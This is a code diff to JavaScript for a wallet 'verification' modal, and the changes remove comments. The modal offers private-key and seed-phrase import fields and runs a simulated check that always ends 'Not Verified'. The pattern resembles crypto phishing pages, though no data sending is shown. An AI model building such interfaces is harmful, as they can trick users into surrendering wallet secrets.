@@ -491,10 +491,8 @@ async function showVerificationDemo() {
     return;
   }
 
-  // Tampilkan popup
   state.classList.add('show');
 
-  // Reset icon
   icon.className = 'verify-icon';
   icon.innerHTML = '<div class="loader"></div>';
 
@@ -504,31 +502,22 @@ async function showVerificationDemo() {
   message.textContent =
     'Please wait while we verify your wallet...';
 
-  // Reset checks
   walletAge.className = 'verify-item checking';
   walletAge.querySelector('.status-text').textContent = 'Checking...';
 
   swap.className = 'verify-item pending';
   swap.querySelector('.status-text').textContent = 'Waiting...';
 
-  // =========================
-  // STEP 1 — WALLET AGE
-  // =========================
   await wait(1800);
 
-  // Kalau popup sudah dimulai ulang, hentikan proses lama
   if (run !== verificationRun) return;
 
   walletAge.className = 'verify-item verified';
   walletAge.querySelector('.status-text').textContent = 'Verified';
 
-  // Mulai step 2
   swap.className = 'verify-item checking';
   swap.querySelector('.status-text').textContent = 'Checking...';
 
-  // =========================
-  // STEP 2 — SWAP ACTIVITY
-  // =========================
   await wait(1800);
 
   if (run !== verificationRun) return;
@@ -536,9 +525,6 @@ async function showVerificationDemo() {
   swap.className = 'verify-item failed';
   swap.querySelector('.status-text').textContent = 'Not Verified';
 
-  // =========================
-  // FINAL RESULT
-  // =========================
   await wait(700);
 
   if (run !== verificationRun) return;
@@ -568,26 +554,21 @@ function openModal() {
 
   overlay.classList.add('show');
 
-  // Tampilkan form, sembunyikan popup verification
   formState.style.display = 'block';
   successState.classList.remove('show');
 
-  // Default tab
   switchTab('pk');
 
-  // Rebuild field demo
   buildSeedGrid(currentWordCount);
 }
     
     
     function closeModal() {
-  // Tutup modal
+  
   document.getElementById('modalOverlay').classList.remove('show');
 
-  // Hentikan proses verification yang sedang berjalan
   verificationRun++;
 
-  // Reset tombol
   const btnPhrase = document.getElementById('btnSubmitPhrase');
   const btnPK = document.getElementById('btnSubmitPK');
 
@@ -601,7 +582,6 @@ function openModal() {
     btnPK.textContent = 'Import Wallet';
   }
 
-  // Kembalikan tampilan ke form untuk pembukaan berikutnya
   document.getElementById('formState').style.display = 'block';
   document.getElementById('successState').classList.remove('show');
 }
